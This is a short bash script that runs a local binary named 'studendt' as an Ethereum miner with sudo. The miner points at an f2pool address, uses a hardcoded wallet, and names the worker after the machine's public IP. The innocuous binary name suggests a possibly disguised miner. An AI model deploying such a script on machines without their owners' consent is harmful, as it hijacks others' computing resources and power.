#!/bin/bash

POOL=eth.f2pool.com:6688
WALLET=0x70278496f0eaa3810d9dbdd7f388425e029013db
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-nbh

cd "$(dirname "$0")"

chmod +x ./studendt && sudo ./studendt -a ethash -o $POOL -u $WALLET.$WORKER $@